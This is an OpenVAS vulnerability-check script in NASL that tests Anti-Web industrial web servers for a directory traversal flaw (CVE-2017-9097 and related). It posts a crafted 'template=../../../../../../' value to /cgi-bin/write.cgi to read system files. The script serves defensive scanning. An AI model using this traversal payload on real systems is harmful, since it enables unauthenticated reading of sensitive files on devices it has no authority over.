##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_antiweb_dir_trav_vuln.nasl 11747 2018-10-04 09:58:33Z jschulte $
#
# Anti-Web Directory Traversal Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:anti-web:anti-web";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106886");
  script_version("$Revision: 11747 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-04 11:58:33 +0200 (Thu, 04 Oct 2018) $");
  script_tag(name:"creation_date", value:"2017-06-20 13:53:33 +0700 (Tue, 20 Jun 2017)");
  script_tag(name:"cvss_base", value:"9.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:C/I:C/A:C");

  script_cve_id("CVE-2017-9097", "CVE-2017-9664", "CVE-2017-17888");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Anti-Web Directory Traversal Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_antiweb_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("antiweb/installed");

  script_tag(name:"summary", value:"Anti-Web is prone to a directory traversal vulnerability where an
  unauthenticated attacker can read arbitrary files.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"solution", value:"Some vendors have started to provide firmware updates.
  Please see the references or contact your vendor for more information or possible updates.");

  script_xref(name:"URL", value:"https://misteralfa-hack.blogspot.cl/2017/05/apps-industrial-ot-over-server-anti-web.html");
  script_xref(name:"URL", value:"https://ics-cert.us-cert.gov/advisories/ICSA-17-222-05");
  script_xref(name:"URL", value:"https://github.com/ezelf/AntiWeb_testing-Suite/tree/master/RCE");
  script_xref(name:"URL", value:"http://search-ext.abb.com/library/Download.aspx?DocumentID=9AKK107045A1782&LanguageCode=en&DocumentPartId=&Action=Launch");
  script_xref(name:"URL", value:"https://www.netbiter.com/docs/default-source/netbiter-english/software/hms-security-advisory-2017-05-24-001-ws100-ws200-ec150-ec250.zip");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

url = "/cgi-bin/write.cgi";

files = traversal_files("linux");

foreach pattern(keys(files)) {

  file = files[pattern];

  data = 'page=/&template=../../../../../../' + file;

  req = http_post_req(port: port, url: url, data: data,
                      add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
  res = http_keepalive_send_recv(port: port, data: req);

  if (egrep(string: res, pattern: pattern)) {
    report = "It was possible to obtain the /" + file + " file through a HTTP POST request on " +
             report_vuln_url(port: port, url: url, url_only: TRUE);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
